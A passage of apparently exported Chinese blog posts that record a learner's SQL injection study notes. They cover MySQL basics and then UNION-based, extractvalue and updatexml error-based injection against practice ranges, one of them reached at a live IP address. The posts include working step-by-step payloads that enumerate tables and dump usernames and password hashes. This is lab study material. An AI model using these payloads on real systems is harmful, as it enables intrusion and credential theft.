语句的结果合并成一个结果集。</p>\n<p>请注意以下几点：</p>\n<ul>\n<li>通过 <code>UNION</code> 连接的查询必须具有相同数量的列。</li>\n<li>列必须具有相似的数据类型。</li>\n<li>列的顺序必须相同。</li>\n<li><code>UNION</code> 消除了重复数据行，默认情况下是剔除</li>\n</ul>\n<p>基本语法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT column_name(s) FROM table1<br>UNION<br>SELECT column_name(s) FROM table2;<br></code></pre></td></tr></table></figure>\n\n<p>例如，考虑 <code>employees</code> 表和 <code>customers</code> 表的以下示例：</p>\n<p>表：<code>employees</code></p>\n<table>\n<thead>\n<tr>\n<th>employee_id</th>\n<th>first_name</th>\n<th>last_name</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>John</td>\n<td>Doe</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Jane</td>\n<td>Smith</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Bill</td>\n<td>Johnson</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Emily</td>\n<td>Davis</td>\n</tr>\n</tbody></table>\n<p>表：<code>customers</code></p>\n<table>\n<thead>\n<tr>\n<th>customer_id</th>\n<th>first_name</th>\n<th>last_name</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>C01</td>\n<td>Alex</td>\n<td>Smith</td>\n</tr>\n<tr>\n<td>C02</td>\n<td>John</td>\n<td>Doe</td>\n</tr>\n<tr>\n<td>C03</td>\n<td>Jane</td>\n<td>Smith</td>\n</tr>\n</tbody></table>\n<p>我们现在想要将 <code>employees</code> 表中 <code>first_name</code> 和 <code>last_name</code> 列与 <code>customers</code> 表中 <code>first_name</code> 和 <code>last_name</code> 列进行组合，并消除重复记录。以下是可以使用的 <code>UNION</code> 查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT first_name, last_name FROM employees<br>UNION<br>SELECT first_name, last_name FROM customers;<br></code></pre></td></tr></table></figure>\n\n<p>然后返回以下结果：</p>\n<table>\n<thead>\n<tr>\n<th>first_name</th>\n<th>last_name</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Alex</td>\n<td>Smith</td>\n</tr>\n<tr>\n<td>Bill</td>\n<td>Johnson</td>\n</tr>\n<tr>\n<td>Emily</td>\n<td>Davis</td>\n</tr>\n<tr>\n<td>Jane</td>\n<td>Smith</td>\n</tr>\n<tr>\n<td>John</td>\n<td>Doe</td>\n</tr>\n</tbody></table>\n<p>需要注意的是，使用 <code>UNION</code> 进行查询时，将执行两个或多个查询，并计算联接结果。因此，较大的表可能会导致性能</p>\n<p>因此，union的语句就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">第一个select语句 union 第二个select语句<br></code></pre></td></tr></table></figure>\n\n<p>具体这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select name from test_table union select name from test_table2;<br>+------------+<br>| name       |<br>+------------+<br>| Tina       |<br>| Vincent    |<br>| LittleCute |<br>| BigClever  |<br>+------------+<br>4 rows in set (0.00 sec)<br><br>mysql&gt; select name from test_table union select age from test_table2;<br>+---------+<br>| name    |<br>+---------+<br>| Tina    |<br>| Vincent |<br>| 1       |<br>| 2       |<br>+---------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n<p>注意一个问题，<strong>前后列数要相同</strong></p>\n<p>如果有缺列，可以自己补一个</p>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select * from users where id=1 union select *,随便 from emails where id=3<br></code></pre></td></tr></table></figure>\n\n<p>这将在原始查询的结果数据集中添加一列的值</p>\n<h1 id=\"3-group-by-x2F-order-by\"><a href=\"#3-group-by-x2F-order-by\" class=\"headerlink\" title=\"3 group by &#x2F; order by\"></a>3 group by &#x2F; order by</h1><p>这个没什么难度，直接上指令吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select 列名 from 表名 group by 列名<br></code></pre></td></tr></table></figure>\n\n<p>注意，这里列名不能是“*”</p>\n<p>这个就是将相同数据放到一起</p>\n<p>用来盘列名，</p>\n<p>同样order by，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select 列名 from 表名 order by 1<br></code></pre></td></tr></table></figure>\n\n<p>用于排序，string用ascii码表排序，</p>\n<p>int就是正常的大小排序</p>\n<p>也可以用来盘列名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select name from test_table group by name;<br>+---------+<br>| name    |<br>+---------+<br>| Tina    |<br>| Vincent |<br>+---------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select age from test_table order by 1;<br>+------+<br>| age  |<br>+------+<br>|   17 |<br>|   18 |<br>+------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-LIMIT\"><a href=\"#4-LIMIT\" class=\"headerlink\" title=\"4 LIMIT\"></a>4 LIMIT</h1><p>定义</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select 列名 from 表名 where id=1 limit m,n<br></code></pre></td></tr></table></figure>\n\n<p>从第m行开始显示n行</p>\n<h1 id=\"5-and-or\"><a href=\"#5-and-or\" class=\"headerlink\" title=\"5 and or\"></a>5 and or</h1><p>and就是两者都为true才返回true，否则返回false</p>\n<p>or就是有一个true就返回true，否则返回false</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select age from test_table where age=17 union select age from test_table2 where name=&#x27;LittleCute&#x27; and age=1;<br>+------+<br>| age  |<br>+------+<br>|   17 |<br>|    1 |<br>+------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"6-函数-group-concat\"><a href=\"#6-函数-group-concat\" class=\"headerlink\" title=\"6 函数 group_concat()\"></a>6 函数 group_concat()</h1><p>这个是sql注入中最重要的一个函数</p>\n<p>它用于将多行数据变成一行，</p>\n<p>这样就有回显了，</p>\n<p>相当于把表变成一个string类型的东西回显出来</p>\n<h1 id=\"7-函数-database\"><a href=\"#7-函数-database\" class=\"headerlink\" title=\"7 函数 database()\"></a>7 函数 database()</h1><p>用于显示当前数据库名</p>\n<h1 id=\"8-函数-version\"><a href=\"#8-函数-version\" class=\"headerlink\" title=\"8 函数 version()\"></a>8 函数 version()</h1><p>用于显示当前MySQL版本</p>\n<h1 id=\"9-最后\"><a href=\"#9-最后\" class=\"headerlink\" title=\"9 最后\"></a>9 最后</h1><p>这个笔记和上一个笔记就是mysql基础的全部内容了，</p>\n<p>明天就是基础注入了</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#3","url":"/2023/06/03/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/","content":"<p>这篇文章学习简单的注入，</p>\n<p>这里直接放上我之前学习的笔记吧</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-判断注入点\"><a href=\"#1-判断注入点\" class=\"headerlink\" title=\"1 判断注入点\"></a>1 判断注入点</h1><p>首先 id&#x3D;1 and 1&#x3D;1</p>\n<p>没改变</p>\n<p>id&#x3D;1 and 1&#x3D;2</p>\n<p>崩了，</p>\n<p>证明此处存在注入点，</p>\n<h1 id=\"2-判断字段数\"><a href=\"#2-判断字段数\" class=\"headerlink\" title=\"2 判断字段数\"></a>2 判断字段数</h1><p>order by语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 order by 3<br></code></pre></td></tr></table></figure>\n\n<p>在3的时候崩了，</p>\n<p>后面查询要1，2</p>\n<p>此处不需要 and 1&#x3D;2，</p>\n<p>因为只是为了判断不需要回显，</p>\n<p>但是后面就要了</p>\n<h1 id=\"3-判断回显点\"><a href=\"#3-判断回显点\" class=\"headerlink\" title=\"3 判断回显点\"></a>3 <strong>判断回显点</strong></h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and 1=2 union select 1,2<br></code></pre></td></tr></table></figure>\n\n<p>这里2有回显，</p>\n<p>因此之后的语句将替换2</p>\n<h1 id=\"4-查询相关内容\"><a href=\"#4-查询相关内容\" class=\"headerlink\" title=\"4 查询相关内容\"></a>4 查询相关内容</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and 1=2 union select 1,database()<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p><a href=\"https://www.w3school.com.cn/sql/sql_select.asp\">select</a> 语句用于从表中选取数据。<br><a href=\"https://www.w3school.com.cn/sql/sql_union.asp\">union</a> 操作符用于合并两个或多个 SELECT 语句的结果集</p>\n</blockquote>\n<p>查询出当前数据库是名字maoshe</p>\n<p>然后知道数据库之后获取数据库中的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1<br></code></pre></td></tr></table></figure>\n<p>获取到表名是admin后,</p>\n<p>查询admin表中的表头</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=表名 limit 0,1<br></code></pre></td></tr></table></figure>\n\n\n<ul>\n<li>database()就是前面获取的数据库名字</li>\n<li>limit见最后，原来以为是平面直角坐标系的原理</li>\n</ul>\n<p>然后获取到表头之后，</p>\n<p>需要找到表头之下的数据，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and 1=2 union select 1,列名 from 表名 limit 坐标<br></code></pre></td></tr></table></figure>\n\n<p>就ok了！</p>\n<p>拿下管理员和密码</p>\n<h2 id=\"4-1-0-坑\"><a href=\"#4-1-0-坑\" class=\"headerlink\" title=\"4.1.0 坑\"></a>4.1.0 坑</h2><p>这里发现似乎和平面直角坐标系有点不同，</p>\n<p>去搜了一下</p>\n<blockquote>\n<p>limit 3,2”表示从第四行数据开始，取两条数据</p>\n</blockquote>\n<p>原来是这样。。。。</p>\n<p>我像个弱智一样对着excel比划半天。。。</p>\n<p>至此结束！</p>\n<blockquote>\n<p>参考：<a href=\"https://blog.csdn.net/Genevieve_xiao/article/details/119487157\">SQL注入（一）—— sql手动注入实操_Genevieve_xiao的博客-CSDN博客</a></p>\n</blockquote>\n<h1 id=\"5-实操\"><a href=\"#5-实操\" class=\"headerlink\" title=\"5 实操\"></a>5 实操</h1><p>这里去墨客开一个靶场，</p>\n<p>就选那个被蹂躏千百遍的手工注入靶场吧，</p>\n<p>url:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://124.70.91.203:41907/new_list.php?id=tingjigonggao<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"寻找注入点\"><a href=\"#寻找注入点\" class=\"headerlink\" title=\"寻找注入点\"></a>寻找注入点</h2><p>首先要一个报错</p>\n<p>这里不是 and 1&#x3D;2报错</p>\n<p>而是添加一个单引号闭合前面的内容，</p>\n<p>因为这个是字符型注入</p>\n<h2 id=\"order-by判断字段数\"><a href=\"#order-by判断字段数\" class=\"headerlink\" title=\"order by判断字段数\"></a>order by判断字段数</h2><p>这里判断到5就报错了，</p>\n<p>说明需要1，2，3，4</p>\n<h2 id=\"回显\"><a href=\"#回显\" class=\"headerlink\" title=\"回显\"></a>回显</h2><p>然后构造语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-tingjigonggao&#x27; union select 1,2,3,4--+<br></code></pre></td></tr></table></figure>\n\n<p><strong>注意！！！！</strong></p>\n<ul>\n<li>最后要–+</li>\n<li>要在停机公告前面加入一个-报错！！！没有这个-死活出不来！！</li>\n</ul>\n<p>发现回显位是2,3</p>\n<p>那么我就选代表我的2吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-tingjigonggao&#x27; union select 1,database(),3,4--+<br></code></pre></td></tr></table></figure>\n\n<p>当前数据库是<strong>mozhe_discuz_stormgroup</strong></p>\n<h2 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1tingjigonggao&#x27; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>\n\n<p>然后回显显示是</p>\n<p><strong>notice,stormgroup_member</strong></p>\n<p>前面一个notice是公告的意思，</p>\n<p>一看就不是，</p>\n<p>后面的那个解释为“暴风雪组_成员”。。。。</p>\n<p>我拙劣的英语。。</p>\n<p>反正带member的肯定就是这个了！</p>\n<h2 id=\"获取表内表头\"><a href=\"#获取表内表头\" class=\"headerlink\" title=\"获取表内表头\"></a>获取表内表头</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-tingjigonggao&#x27; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&quot;stormgroup_member&quot; limit 0,1 --+<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>table_name&#x3D;后面的内容要加双引号！！！！</li>\n</ul>\n<p>获取到表头是</p>\n<p><strong>id,name,password,status</strong></p>\n<p>我们获取的就是name和password</p>\n<h2 id=\"获取表格内容\"><a href=\"#获取表格内容\" class=\"headerlink\" title=\"获取表格内容\"></a>获取表格内容</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,group_concat(id,0x0a,name,0x0a,password,0x0a,status),3,4 from stormgroup_member--+<br></code></pre></td></tr></table></figure>\n\n<p>这里语句构造的是writeup里面的，</p>\n<p>然后发现他的这个很简单，</p>\n<p>然后chatgpt了一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,group_concat(id,0x0a,name,0x0a,password,0x0a,status),3,4 from stormgroup_member--+ 请讲述一下这个sql注入语句<br><br><br>ChatGPT<br>这个SQL注入语句是一种尝试获取敏感信息的攻击方式。让我为您解释一下这个注入语句的各个部分：<br><br>?id=-1&#x27;：这是一个查询参数，它尝试注入到SQL查询中的id条件中。-1是一个无效的ID，但在这种情况下，它被用作占位符，以便注入其他的SQL代码。<br><br>union select 1,group_concat(id,0x0a,name,0x0a,password,0x0a,status),3,4 from stormgroup_member：这是注入的主要部分，它使用UNION SELECT语句将自定义结果集与原始查询结果合并。在这种情况下，查询的目标是从stormgroup_member表中获取敏感信息。<br><br>1：这是注入的第一个列值，只是用作占位符。<br><br>group_concat(id,0x0a,name,0x0a,password,0x0a,status)：这是注入的第二个列值，它使用group_concat函数将stormgroup_member表中的多个列连接在一起，并用换行符（0x0a）分隔每个字段的值。通过这种方式，攻击者可以获取包含id、name、password和status的所有记录的组合结果。<br><br>3和4：这些是注入的后续列值，只是用作占位符。<br><br>--+：这是用于注释掉SQL查询语句中剩余部分的注释符号。--表示单行注释，它使+后面的内容被忽略。<br><br>通过这个注入语句，攻击者试图在stormgroup_member表中获取每个记录的id、name、password和status字段的值。这种注入攻击对于存在安全漏洞的应用程序是一种常见的攻击方式，因此开发人员应该采取适当的安全措施来防止这种类型的攻击，例如使用参数化查询或输入验证来阻止SQL注入。<br><br><br>User<br>0x0a是什么意思？没有这个东西可以吗<br><br>ChatGPT<br>抱歉，我之前的回答中引入了一些混淆，导致了误解。让我来更正一下。<br><br>0x0a代表十六进制的数值，表示换行符（\\n）的ASCII码。在某些情况下，攻击者可能会尝试在数据之间插入换行符，以便在结果中进行分隔。然而，这并不是必需的，且具体使用哪种分隔符取决于数据库和应用程序的配置。<br><br>对于上述的SQL注入语句，你可以尝试将0x0a移除，即使没有这个换行符，依然可以执行注入攻击。修正后的注入语句如下：<br>?id=-1&#x27; union select 1,group_concat(id,name,password,status),3,4 from stormgroup_member--<br>在这种情况下，group_concat函数将id、name、password和status字段的值以默认的分隔符（通常是逗号）连接起来。<br></code></pre></td></tr></table></figure>\n\n<p>那么去掉0x0a也是可以的，</p>\n<p>加上就是为了阅读更加方便一点</p>\n<p>至此就拿到了</p>\n<p><strong>2mozhe356f589a7df439f6f744ff19bb8092c00,1mozhe48f9755b3836822abe14efdd1d2a90d51</strong></p>\n<p>去cmd5试一下就会发现后面那个才是能用的</p>\n<h1 id=\"6-小结\"><a href=\"#6-小结\" class=\"headerlink\" title=\"6 小结\"></a>6 小结</h1><p>基本每一步都是一个报错</p>\n<p>现在我在这里默写一下：</p>\n<ol>\n<li><p>尝试造成报错</p>\n<p>在id&#x3D;后面加上“-”报错，然后使用“ ‘ ” 闭合前面的语句</p>\n</li>\n<li><p>order by 获取获取字段数</p>\n<p>?id&#x3D;-1’ order by n –+</p>\n<p>直到n报错为止</p>\n</li>\n<li><p>注出回显点</p>\n<p>?id&#x3D;-1’ union select 1,2,3,(n-1) –+</p>\n<p>回显哪个数就代表哪个是回显点</p>\n<p>接下来的语句替换其中一个数即可</p>\n</li>\n<li><p>获取数据库名字</p>\n<p>?id&#x3D;-1’ union select 1,group_concat(database()),3,4 –+</p>\n</li>\n<li><p>获取数据库中的表名字</p>\n<p>?id&#x3D;-1’ union select 1,group_concat(table_name),3,4 from information_schema.tables where <strong>table_schema</strong>&#x3D;database() –+</p>\n<p>【注意】是table_schema，不是schema_name，默写的时候这里默错了</p>\n</li>\n<li><p>获取表中的表头</p>\n<p>?id&#x3D;-1’ union select 1,group_concat(<strong>column_name</strong>),3,4 from information_schema.<strong>columns</strong> where table_schema&#x3D;database() and table_name&#x3D;”{前面获取的表}” –+</p>\n<p>【注意】table_name&#x3D;后面要加双引号，最后要–+，默写的时候忘记加了导致报错</p>\n</li>\n<li><p>获取表中的内容</p>\n<p>?id&#x3D;-1’ union select 1,group_concat(id,name,password,status),3,4 from {表名}–+</p>\n</li>\n</ol>\n<p>结束！！！！！</p>\n<h1 id=\"7-最后\"><a href=\"#7-最后\" class=\"headerlink\" title=\"7 最后\"></a>7 最后</h1>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#5","url":"/2023/06/05/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/","content":"<p>这篇文章学习updatexml报错注入</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1 前言\"></a>1 前言</h1><p>今天的报错注入所用的函数和上一节课几乎没有区别，</p>\n<p>同样是在一个xml文档里面查询，</p>\n<p>遇上一个extractvalue不同的地方就是搜寻到数据之后，</p>\n<p>还可以指定一个参数来替换他，</p>\n<p>（但是sql注入中应该不会出现正好搜到这种尴尬情况</p>\n<p>因此原理起始和前面差不多</p>\n<h1 id=\"2-注入\"><a href=\"#2-注入\" class=\"headerlink\" title=\"2 注入\"></a>2 注入</h1><p>直接开始吧，没有什么新的知识了</p>\n<h2 id=\"2-1-构造order-by查询字段数\"><a href=\"#2-1-构造order-by查询字段数\" class=\"headerlink\" title=\"2.1 构造order by查询字段数\"></a>2.1 构造order by查询字段数</h2><p>这个不需要有一堆语句，直接朴素的orderby即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&quot; order by 3 --+<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-1-注出回显点\"><a href=\"#2-1-1-注出回显点\" class=\"headerlink\" title=\"2.1.1 注出回显点\"></a>2.1.1 注出回显点</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&quot; and 1=updatexml(1,concat(0x7e,(select group_concat(1,2,3))),11111111) --+<br></code></pre></td></tr></table></figure>\n\n<p>但是在这里这一步没有意义</p>\n<h2 id=\"2-2-查询\"><a href=\"#2-2-查询\" class=\"headerlink\" title=\"2.2 查询\"></a>2.2 查询</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&quot; and 1=updatexml(1,concat(0x7e,(database())),11111111) --+<br></code></pre></td></tr></table></figure>\n\n<p>获取数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&quot; and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),11111111) --+<br></code></pre></td></tr></table></figure>\n\n<p>获取其中的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&quot; and 1=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)),11111111) --+<br></code></pre></td></tr></table></figure>\n\n<p>获取表名中的列名（表头）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&quot; and 1=updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),11111111) --+<br></code></pre></td></tr></table></figure>\n\n<p>获取表中内容，但是只有32个字符，配上substring()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&quot; and 1=updatexml(1,concat(0x7e,substring((select group_concat(id,username,password) from users),31,31)),11111111) --+<br></code></pre></td></tr></table></figure>\n\n<p>就可以无限获取后面的内容了！</p>\n<p>拿下</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#4","url":"/2023/06/04/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4/","content":"<p>这篇文章学习extractvalue报错注入</p>\n<span id=\"more\"></span>\n\n<p>今天开始前把靶场环境搭建了一下，</p>\n<p>花了不少时间</p>\n<p>今天学习的报错注入是一个庞大的家族，</p>\n<p>（他应该属于字符型注入</p>\n<p>有多少？见下图</p>\n\n\n<h1 id=\"1-创建数据库\"><a href=\"#1-创建数据库\" class=\"headerlink\" title=\"1 创建数据库\"></a>1 创建数据库</h1><p>按照课程ppt的演示，</p>\n<p>先创建一个叫xml数据库吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; create database ctfsu charset utf8;<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt; use ctfsu<br>Database changed<br>mysql&gt; create table xml(doc varchar(150));<br>Query OK, 0 rows affected (0.01 sec)<br></code></pre></td></tr></table></figure>\n\n<p>然后抄一下他ppt里面的语句</p>\n<p>extractvalue函数的介绍是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">EXTRACTVALUE 函数是 SQL 中的 XML 函数之一，用于从 XML 文档中提取指定节点的值。<br><br>该函数需要两个参数：XML文档和XPath表达式（XML路径语言），返回值为满足XPath表达式的第一个节点的值。如果未找到任何节点，则返回 NULL。<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"2-Basic\"><a href=\"#2-Basic\" class=\"headerlink\" title=\"2 Basic\"></a>2 Basic</h1><p>然后他的概念就是通过报错回显数据</p>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select extractvalue(doc,concat(0x7e,(select database()))) from xml;<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~ctfsu&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>所以这里可以知道他的数据库名字了，</p>\n<p><strong>但是为什么知道他的文档名叫doc呢？concat又是什么函数？0x7e又是什么意思？</strong></p>\n<p>问一下chatgpt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">这段SQL语句是一种典型的XML注入攻击方式，它利用了MySQL数据库中“ExtractValue()”函数漏洞，可以使攻击者在不登录的情况下访问敏感数据。<br><br>具体而言：<br><br>doc 应该代表一个XML文档名或路径，攻击者需要在sql查询之前探测出目标数据库中存在一个可供利用的XML文档并将其替换为正确的文档名或路径。<br>concat() 是一个字符串函数，它将多个字符串连接起来形成一个字符串。在这里，攻击者使用 0x7e 字符进行字符串拼接， 0x7e 在ASCII表中的十进制值是“126”，表示波浪号（~）。<br>extractvalue() 函数用于从XML文档中提取值，类似于XPath查询。但是 extractvalue() 函数被认为是已弃用函数，并且可能导致安全问题，因为它允许将未经过滤的输入作为xpath字符串使用，这会导致SQL注入。<br>因为程序员没有对传递给 extractvalue() 函数的参数进行合适的编码或过滤，攻击者可以通过注入SQL语句，绕过原本的措施获取所需的信息。<br></code></pre></td></tr></table></figure>\n\n<p><strong>那concat函数和group_concat函数有什么区别？</strong></p>\n<p>sql中，<code>concat()</code>和<code>group_concat()</code>函数都是SQL中的字符串函数，但它们之间有一些关键的区别。</p>\n<ul>\n<li><p><code>concat()</code>函数将两个或多个字符串联系在一起形成一个新的字符串。例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CONCAT(&#x27;Hello&#x27;,&#x27; &#x27;,&#x27;world!&#x27;) AS greeting;<br></code></pre></td></tr></table></figure>\n\n<p>运行以上代码后，将会返回一个值为”Hello world!”的结果集。</p>\n</li>\n<li><p><code>group_concat()</code> 函数用于将一个组内的多行数据串联为一个字符串。在 MySQL 中，组级别的连接可以通过 <code>GROUP BY</code> 和 <code>GROUP_CONCAT()</code> 结合使用来执行。例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT category, GROUP_CONCAT(product_name SEPARATOR &#x27;-&#x27;) as products <br>FROM products_table <br>GROUP BY category;<br></code></pre></td></tr></table></figure>\n\n<p>在这个例子中， <code>GROUP_CONCAT()</code> 按类别分组，并拼接现有的 <code>product_name</code> 列中所有产品的名称，其中每个产品名称由破折号“-”分隔。 最终结果可能类似于以下内容：</p>\n<table>\n<thead>\n<tr>\n<th>Category</th>\n<th>Products</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Clothing</td>\n<td>T-Shirt-Jeans</td>\n</tr>\n<tr>\n<td>Electronics</td>\n<td>Camera-Headphones</td>\n</tr>\n<tr>\n<td>Outdoor</td>\n<td>Backpack-Tent</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<p>因此，<code>concat()</code>主要是用于将多个输入字符串连接成一个字符串并返回，而 <code>group_concat()</code> 更适用于将聚合结果拼接成单个字符串，通常在与 GROUP BY 子句一起使用的时候</p>\n<h1 id=\"3-开始注入\"><a href=\"#3-开始注入\" class=\"headerlink\" title=\"3 开始注入\"></a>3 开始注入</h1><p>构造如下语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(database()))) --+<br></code></pre></td></tr></table></figure>\n\n<p>得到数据库名</p>\n<p>然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))) --+<br></code></pre></td></tr></table></figure>\n\n<p>得到所有表名，然后凭经验（或者凭英语）挑一个表，构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))) --+<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3-1-0-弊端\"><a href=\"#3-1-0-弊端\" class=\"headerlink\" title=\"3.1.0 弊端\"></a>3.1.0 弊端</h2><p>只能返回32个字符</p>\n<h2 id=\"3-1-1-解决方法\"><a href=\"#3-1-1-解决方法\" class=\"headerlink\" title=\"3.1.1 解决方法\"></a>3.1.1 解决方法</h2><p>那么就无法获得32字符之后的东西了吗？</p>\n<p>介绍一个函数substring</p>\n<p><code>SUBSTRING()</code> 函数用于提取字符串的一部分，语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SUBSTRING(str, start, length)<br></code></pre></td></tr></table></figure>\n\n<p>其中：</p>\n<ul>\n<li><code>str</code>为要截取的字符串。</li>\n<li><code>start</code>为起始位置。如果是正数，则表示从 <code>str</code> 的第 <code>n</code> 个字符开始截取；如果是负数，则表示从 <code>str</code> 的倒数第 <code>n</code> 个字符开始截取。</li>\n<li><code>length</code>(可选) 表示要截取的长度。如果忽略此参数，则返回从 <code>start</code> 位置到字符串结尾的所有字符。</li>\n</ul>\n<p>例如，假设有一个字符串：<code>Hello World!</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT SUBSTRING(&#x27;Hello World!&#x27;, 7); -- 输出 &#x27;World!&#x27;<br>SELECT SUBSTRING(&#x27;Hello World!&#x27;, -6); -- 输出 &#x27;World!&#x27;<br>SELECT SUBSTRING(&#x27;Hello World!&#x27;, 1, 5); -- 输出 